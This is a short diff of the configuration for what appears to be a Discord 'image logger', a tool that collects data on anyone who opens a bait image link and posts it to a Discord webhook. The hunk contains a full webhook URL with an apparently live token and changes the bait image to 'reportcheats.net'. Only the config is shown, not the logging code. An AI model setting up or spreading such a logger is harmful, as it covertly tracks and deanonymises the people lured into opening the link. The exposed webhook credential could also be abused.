@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1479963260194263100/q0qCN0w0CEHI4JsgZ8k_g2LSgC7Ah6_G0KexpP3EOA2koIHXN75w8zoxz1w4idBrgUO0",
-    "image": "https://static.wikitide.net/deathbattlewiki/c/cb/Portrait.a-train.png", # You can also have a custom image by using a URL argument
+    "image": "https://reportcheats.net/", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
